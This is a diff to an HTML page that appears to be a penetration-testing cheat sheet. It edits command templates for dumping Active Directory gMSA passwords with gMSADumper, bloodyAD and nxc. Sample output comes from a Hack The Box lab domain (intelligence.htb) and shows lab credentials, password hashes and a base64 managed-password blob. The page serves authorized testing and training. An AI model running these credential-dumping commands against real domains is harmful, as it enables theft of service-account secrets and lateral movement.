@@ -330,7 +330,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <button data-tabset="set1" data-tabcontent="tab3" >nxc</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 gMSADumper.py -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; -l &lt;DC&gt; -d &lt;DOMAIN&gt;
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 gMSADumper.py -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -l &lt;DC&gt; -d &lt;DOMAIN&gt;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
 </span></span><span class="line"><span class="cl"><span class="go">Users or groups who can read password for svc_int$:
 </span></span></span><span class="line"><span class="cl"><span class="go"> &gt; DC$
@@ -340,7 +340,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper</a></em></small></p></div>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; get object &#39;&lt;TARGET_OBJECT&gt;&#39; --attr msDS-ManagedPassword
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC_IP&gt; &amp;&amp; bloodyAD -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; get object &#39;&lt;TARGET_OBJECT&gt;&#39; --attr msDS-ManagedPassword
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d intelligence.htb -u ted.graves -p <span class="s1">&#39;Mr.Teddy&#39;</span> --host intelligence.htb get object <span class="s1">&#39;svc_int$&#39;</span> --attr msDS-ManagedPassword 
 </span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
@@ -348,7 +348,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">msDS-ManagedPassword.B64ENCODED: wcVVmCKWYOZszus92zsZDFqtPFYu960EdHowLnWB5vChR4R/yj+hgVusvxgnG1OYREO70qnEiCEfP62qLZluS/UHz53T94CItJ+YxA6W5jiWTy0L03JgE1m87NCnxrzGSXHXjp4Ja1OKDde9RrIaqGN7C7cFZth05q1bOOO+x8+jdD1xRXHKgig5LDk4inLQ1xqu7Lc4vT/hIIPx2dbS0FNwGtKu2NTTVAAB/LgVwYnfMNkpti2T0cE8R12HzjGVLV/54GLU1O8iLyXdnfgAQUdnccIlSacJ3XItjjeTWuOwCKQKmc0o8BbE+rHjA5dotmBiBHsE9bw3YsCh0SNTeA==
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc ldap -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; -d &lt;DOMAIN&gt; &lt;DC&gt; --gmsa
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc ldap -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -d &lt;DOMAIN&gt; &lt;DC&gt; --gmsa
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nxc ldap -u ted.graves -p <span class="s1">&#39;Mr.Teddy&#39;</span> -d intelligence.htb dc01.intelligence.htb --gmsa
 </span></span><span class="line"><span class="cl"><span class="go">SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
 </span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.10.248    636    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
